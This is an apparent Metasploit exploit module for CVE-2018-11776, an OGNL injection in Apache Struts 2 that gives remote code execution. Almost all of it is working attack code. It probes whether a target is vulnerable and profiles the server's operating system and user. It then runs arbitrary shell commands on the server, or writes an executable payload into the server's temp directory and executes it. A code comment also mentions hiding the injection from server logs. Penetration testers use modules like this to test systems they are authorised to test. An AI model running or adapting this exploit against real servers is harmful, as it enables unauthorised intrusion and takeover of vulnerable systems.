# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  # Eschewing CmdStager for now, since the use of &#039;\&#039; and &#039;;&#039; are killing me
  #include Msf::Exploit::CmdStager   # https://github.com/rapid7/metasploit-framework/wiki/How-to-use-command-stagers

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts 2 Namespace Redirect OGNL Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote code execution vulnerability in Apache Struts
        version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed
        via an endpoint that makes use of a redirect action.

        Native payloads will be converted to executables and dropped in the
        server&#039;s temp dir. If this fails, try a cmd/* payload, which won&#039;t
        have to write to the disk.
      },
      #TODO: Is that second paragraph above still accurate?
      &#039;Author&#039;         => [
        &#039;Man Yue Mo&#039;, # Discovery
        &#039;hook-s3c&#039;,   # PoC
        &#039;asoto-r7&#039;,   # Metasploit module
        &#039;wvu&#039;         # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2018-11776&#039;],
        [&#039;URL&#039;, &#039;https://lgtm.com/blog/apache_struts_CVE-2018-11776&#039;],
        [&#039;URL&#039;, &#039;https://cwiki.apache.org/confluence/display/WW/S2-057&#039;],
        [&#039;URL&#039;, &#039;https://github.com/hook-s3c/CVE-2018-11776-Python-PoC&#039;],
      ],
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        => [
        [
          &#039;Automatic detection&#039;, {
            &#039;Platform&#039;   => %w{ unix windows linux },
            &#039;Arch&#039;       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
          },
        ],
        [
          &#039;Windows&#039;, {
            &#039;Platform&#039;   => %w{ windows },
            &#039;Arch&#039;       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
          },
        ],
        [
          &#039;Linux&#039;, {
            &#039;Platform&#039;       => %w{ unix linux },
            &#039;Arch&#039;           => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
            &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/generic&#039;}
          },
        ],
      ],
      &#039;DisclosureDate&#039; => &#039;Aug 22 2018&#039;, # Private disclosure = Apr 10 2018
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;TARGETURI&#039;, [ true, &#039;A valid base path to a struts application&#039;, &#039;/&#039; ]),
          OptString.new(&#039;ACTION&#039;, [ true, &#039;A valid endpoint that is configured as a redirect action&#039;, &#039;showcase.action&#039; ]),
          OptString.new(&#039;ENABLE_STATIC&#039;, [ true, &#039;Enable "allowStaticMethodAccess" before executing OGNL&#039;, true ]),
        ]
      )
      register_advanced_options(
        [
          OptString.new(&#039;HTTPMethod&#039;, [ true, &#039;The HTTP method to send in the request. Cannot contain spaces&#039;, &#039;GET&#039; ]),
          OptString.new(&#039;HEADER&#039;, [ true, &#039;The HTTP header field used to transport the optional payload&#039;, "X-#{rand_text_alpha(4)}"] ),
          OptString.new(&#039;TEMPFILE&#039;, [ true, &#039;The temporary filename written to disk when executing a payload&#039;, "#{rand_text_alpha(8)}"] ),
        ]
      )
  end

  def check
    # METHOD 1: Try to extract the state of hte allowStaticMethodAccess variable
    ognl = "#_memberAccess[&#039;allowStaticMethodAccess&#039;]"

    resp = send_struts_request(ognl)

    # If vulnerable, the server should return an HTTP 302 (Redirect)
    #   and the &#039;Location&#039; header should contain either &#039;true&#039; or &#039;false&#039;
    if resp && resp.headers[&#039;Location&#039;]
      output = resp.headers[&#039;Location&#039;]
      vprint_status("Redirected to:  #{output}")
      if (output.include? &#039;/true/&#039;)
        print_status("Target does *not* require enabling &#039;allowStaticMethodAccess&#039;.  Setting ENABLE_STATIC to &#039;false&#039;")
        datastore[&#039;ENABLE_STATIC&#039;] = false
        CheckCode::Vulnerable
      elsif (output.include? &#039;/false/&#039;)
        print_status("Target requires enabling &#039;allowStaticMethodAccess&#039;.  Setting ENABLE_STATIC to &#039;true&#039;")
        datastore[&#039;ENABLE_STATIC&#039;] = true
        CheckCode::Vulnerable
      else
        CheckCode::Safe
      end
    elsif resp && resp.code==400
      # METHOD 2: Generate two random numbers, ask the target to add them together.
      #   If it does, it&#039;s vulnerable.
      a = rand(10000)
      b = rand(10000)
      c = a+b

      ognl = "#{a}+#{b}"

      resp = send_struts_request(ognl)

      if resp.headers[&#039;Location&#039;].include? c.to_s
        vprint_status("Redirected to:  #{resp.headers[&#039;Location&#039;]}")
        print_status("Target does *not* require enabling &#039;allowStaticMethodAccess&#039;.  Setting ENABLE_STATIC to &#039;false&#039;")
        datastore[&#039;ENABLE_STATIC&#039;] = false
        CheckCode::Vulnerable
      else
        CheckCode::Safe
      end
    end
  end

  def exploit
    case payload.arch.first
    when ARCH_CMD
      resp = execute_command(payload.encoded)
    else
      resp = send_payload()
    end
  end

  def encode_ognl(ognl)
    # Check and fail if the command contains the follow bad characters:
    #   &#039;;&#039; seems to terminates the OGNL statement
    #   &#039;/&#039; causes the target to return an HTTP/400 error
    #   &#039;\&#039; causes the target to return an HTTP/400 error (sometimes?)

    # TODO: Make sure the following line is uncommented
    bad_chars = %w[; \\ \r \n]    # and maybe &#039;/&#039;
    bad_chars.each do |c|
      if ognl.include? c
        print_error("Bad OGNL request: #{ognl}")
        fail_with(Failure::BadConfig, "OGNL request cannot contain a &#039;#{c}&#039;")
      end
    end

    # The following list of characters *must* be encoded or ORNL will asplode
    encodable_chars = { "%": "%25",       # Always do this one first.  :-)
                        " ": "%20",
                        "\"":"%22",
                        "#": "%23",
                        "&#039;": "%27",
                        "<": "%3c",
                        ">": "%3e",
                        "?": "%3f",
                        "^": "%5e",
                        "`": "%60",
                        "{": "%7b",
                        "|": "%7c",
                        "}": "%7d",
                       #"\/":"%2f",       # Don&#039;t do this.  Just leave it front-slashes in as normal.
                       #";": "%3b",       # Doesn&#039;t work.  Anyone have a cool idea for a workaround?
                       #"\\":"%5c",       # Doesn&#039;t work.  Anyone have a cool idea for a workaround?
                       #"\\":"%5c%5c",    # Doesn&#039;t work.  Anyone have a cool idea for a workaround?
                      }

    encodable_chars.each do |k,v|
     #ognl.gsub!(k,v)                     # TypeError wrong argument type Symbol (expected Regexp)
      ognl.gsub!("#{k}","#{v}")
    end
    return ognl
  end

  def send_struts_request(ognl, payload: nil)
=begin  #badchar-checking code
=end

    ognl = "${#{ognl}}"
    vprint_status("Submitted OGNL: #{ognl}")
    ognl = encode_ognl(ognl)

    headers = {&#039;Keep-Alive&#039;: &#039;timeout=5, max=1000&#039;}

    if payload
      vprint_status("Embedding payload of #{payload.length} bytes")
      headers[datastore[&#039;HEADER&#039;]] = payload
    end

    # TODO: Embed OGNL in an HTTP header to hide it from the Tomcat logs
    uri = "/#{ognl}/#{datastore[&#039;ACTION&#039;]}"

    resp = send_request_cgi(
     #&#039;encode&#039;  => true,     # this fails to encode &#039;\&#039;, which is a problem for me
      &#039;uri&#039;     => uri,
      &#039;method&#039;  => datastore[&#039;HTTPMethod&#039;],
      &#039;headers&#039; => headers
    )

    if resp && resp.code == 404
      fail_with(Failure::UnexpectedReply, "Server returned HTTP 404, please double check TARGETURI and ACTION options")
    end

=begin  #badchar-checking code
    print_status("Response code: #{resp.code}")
    #print_status("Response recv: BODY &#039;#{resp.body}&#039;") if resp.body
    if resp.headers[&#039;Location&#039;]
      print_status("Response recv: LOC: #{resp.headers[&#039;Location&#039;].split(&#039;/&#039;)[1]}")
        print_good("GOT &#039;EM!")
      else
      end
    end
=end

    resp
  end

  def profile_target
    # Use OGNL to extract properties from the Java environment

    properties = { &#039;os.name&#039;: nil,          # e.g. &#039;Linux&#039;
                   &#039;os.arch&#039;: nil,          # e.g. &#039;amd64&#039;
                   &#039;os.version&#039;: nil,       # e.g. &#039;4.4.0-112-generic&#039;
                   &#039;user.name&#039;: nil,        # e.g. &#039;root&#039;
                   #&#039;user.home&#039;: nil,       # e.g. &#039;/root&#039; (didn&#039;t work in testing)
                   &#039;user.language&#039;: nil,    # e.g. &#039;en&#039;
                   #&#039;java.io.tmpdir&#039;: nil,  # e.g. &#039;/usr/local/tomcat/temp&#039; (didn&#039;t work in testing)
                   }

    ognl = ""
    ognl << %q|(#_memberAccess[&#039;allowStaticMethodAccess&#039;]=true).| if datastore[&#039;ENABLE_STATIC&#039;]
    ognl << %Q|(&#039;#{rand_text_alpha(2)}&#039;)|
    properties.each do |k,v|
      ognl << %Q|+(@java.lang.System@getProperty(&#039;#{k}&#039;))+&#039;:&#039;|
    end
    ognl = ognl[0...-4]

    r = send_struts_request(ognl)

    if r.code == 400
      fail_with(Failure::UnexpectedReply, "Server returned HTTP 400, consider toggling the ENABLE_STATIC option")
    elsif r.headers[&#039;Location&#039;]
      # r.headers[&#039;Location&#039;] should look like &#039;/bILinux:amd64:4.4.0-112-generic:root:en/help.action&#039;
      #   Extract the OGNL output from the Location path, and strip the two random chars
      s = r.headers[&#039;Location&#039;].split(&#039;/&#039;)[1][2..-1]

      if s.nil?
        # Since the target didn&#039;t respond with an HTTP/400, we know the OGNL code executed.
        #   But we didn&#039;t get any output, so we can&#039;t profile the target.  Abort.
        return nil
      end

      # Confirm that all fields were returned, and non include extra (:) delimiters
      #   If the OGNL fails, we might get a partial result back, in which case, we&#039;ll abort.
      if s.count(&#039;:&#039;) > properties.length
        print_error("Failed to profile target.  Response from server: #{r.to_s}")
        fail_with(Failure::UnexpectedReply, "Target responded with unexpected profiling data")
      end

      # Separate the colon-delimited properties and store in the &#039;properties&#039; hash
      s = s.split(&#039;:&#039;)
      i = 0
      properties.each do |k,v|
        properties[k] = s[i]
        i += 1
      end

      print_good("Target profiled successfully: #{properties[:&#039;os.name&#039;]} #{properties[:&#039;os.version&#039;]}" +
        " #{properties[:&#039;os.arch&#039;]}, running as #{properties[:&#039;user.name&#039;]}")
      return properties
    else
      print_error("Failed to profile target.  Response from server: #{r.to_s}")
      fail_with(Failure::UnexpectedReply, "Server did not respond properly to profiling attempt.")
    end
  end

  def execute_command(cmd_input, opts={})
    # Semicolons appear to be a bad character in OGNL.  cmdstager doesn&#039;t understand that.
    if cmd_input.include? &#039;;&#039;
      print_warning("WARNING: Command contains bad characters: semicolons (;).")
    end

    begin
      properties = profile_target
      os = properties[:&#039;os.name&#039;].downcase
    rescue
      vprint_warning("Target profiling was unable to determine operating system")
      os = &#039;&#039;
      os = &#039;windows&#039; if datastore[&#039;PAYLOAD&#039;].downcase.include? &#039;win&#039;
      os = &#039;linux&#039;   if datastore[&#039;PAYLOAD&#039;].downcase.include? &#039;linux&#039;
      os = &#039;unix&#039;    if datastore[&#039;PAYLOAD&#039;].downcase.include? &#039;unix&#039;
    end

    if (os.include? &#039;linux&#039;) || (os.include? &#039;nix&#039;)
      cmd = "{&#039;sh&#039;,&#039;-c&#039;,&#039;#{cmd_input}&#039;}"
    elsif os.include? &#039;win&#039;
      cmd = "{&#039;cmd.exe&#039;,&#039;/c&#039;,&#039;#{cmd_input}&#039;}"
    else
      vprint_error("Failed to detect target OS.  Attempting to execute command directly")
      cmd = cmd_input
    end

    # The following OGNL will run arbitrary commands on Windows and Linux
    #   targets, as well as returning STDOUT and STDERR.  In my testing,
    #   on Struts2 in Tomcat 7.0.79, commands timed out after 18-19 seconds.

    vprint_status("Executing: #{cmd}")

    ognl =  ""
    ognl << %q|(#_memberAccess[&#039;allowStaticMethodAccess&#039;]=true).| if datastore[&#039;ENABLE_STATIC&#039;]
    ognl << %Q|(#p=new java.lang.ProcessBuilder(#{cmd})).|
    ognl << %q|(#p.redirectErrorStream(true)).|
    ognl << %q|(#process=#p.start()).|
    ognl << %q|(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).|
    ognl << %q|(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r)).|
    ognl << %q|(#r.flush())|

    r = send_struts_request(ognl)

    if r && r.code == 200
      print_good("Command executed:\n#{r.body}")
    elsif r
      if r.body.length == 0
        print_status("Payload sent, but no output provided from server.")
      elsif r.body.length > 0
        print_error("Failed to run command.  Response from server: #{r.to_s}")
      end
    end
  end

  def send_payload
    # Probe for the target OS and architecture
    begin
      properties = profile_target
      os = properties[:&#039;os.name&#039;].downcase
    rescue
      vprint_warning("Target profiling was unable to determine operating system")
      os = &#039;&#039;
      os = &#039;windows&#039; if datastore[&#039;PAYLOAD&#039;].downcase.include? &#039;win&#039;
      os = &#039;linux&#039;   if datastore[&#039;PAYLOAD&#039;].downcase.include? &#039;linux&#039;
      os = &#039;unix&#039;    if datastore[&#039;PAYLOAD&#039;].downcase.include? &#039;unix&#039;
    end

    data_header = datastore[&#039;HEADER&#039;]
    if data_header.empty?
      fail_with(Failure::BadConfig, "HEADER parameter cannot be blank when sending a payload")
    end

    random_filename = datastore[&#039;TEMPFILE&#039;]

    # d = data stream from HTTP header
    # f = path to temp file
    # s = stream/handle to temp file
    ognl  = ""
    ognl << %q|(#_memberAccess[&#039;allowStaticMethodAccess&#039;]=true).| if datastore[&#039;ENABLE_STATIC&#039;]
    ognl << %Q|(#d=@org.apache.struts2.ServletActionContext@getRequest().getHeader(&#039;#{data_header}&#039;)).|
    ognl << %Q|(#f=@java.io.File@createTempFile(&#039;#{random_filename}&#039;,&#039;tmp&#039;)).|
    ognl << %q|(#f.setExecutable(true)).|
    ognl << %q|(#f.deleteOnExit()).|
    ognl << %q|(#s=new java.io.FileOutputStream(#f)).|
    ognl << %q|(#d=new sun.misc.BASE64Decoder().decodeBuffer(#d)).|
    ognl << %q|(#s.write(#d)).|
    ognl << %q|(#s.close()).|
    ognl << %q|(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).|
    ognl << %q|(#p.start()).|
    ognl << %q|(#f.delete()).|

    success_string = rand_text_alpha(4)
    ognl << %Q|(&#039;#{success_string}&#039;)|

    exe = [generate_payload_exe].pack("m").delete("\n")
    r = send_struts_request(ognl, payload: exe)

    if r && r.headers && r.headers[&#039;Location&#039;].split(&#039;/&#039;)[1] == success_string
      print_good("Payload successfully dropped and executed.")
    elsif r && r.headers[&#039;Location&#039;]
      vprint_error("RESPONSE: " + r.headers[&#039;Location&#039;])
      fail_with(Failure::PayloadFailed, "Target did not successfully execute the request")
    elsif r && r.code == 400
      fail_with(Failure::UnexpectedReply, "Target reported an unspecified error while executing the payload")
    end
  end
end

